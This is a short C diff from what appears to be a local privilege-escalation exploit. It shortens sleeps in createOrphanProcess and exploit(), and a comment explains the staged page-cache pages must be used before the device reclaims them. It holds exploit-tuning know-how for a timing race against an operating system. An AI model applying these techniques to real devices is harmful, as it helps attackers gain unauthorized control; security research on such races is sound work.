@@ -789,7 +789,7 @@ static int createOrphanProcess(void) {
     if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
     if (pid == 0) {
         int pid2 = fork();
-        if (pid2 == 0) { sleep(1); _exit(0); }
+        if (pid2 == 0) { usleep(80000); _exit(0); }
         _exit(0);
     }
     TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
@@ -914,7 +914,10 @@ static int exploit(void) {
     }
 
     rc = 2;
-    usleep(500000);
+    /* Nothing may sit between "staged images intact" and the hook firing: the
+     * staged pages are clean page cache and this device reclaims them within
+     * roughly a second. */
+    usleep(10000);
     
     printf("\n=== init  ===\n");
     createOrphanProcess();
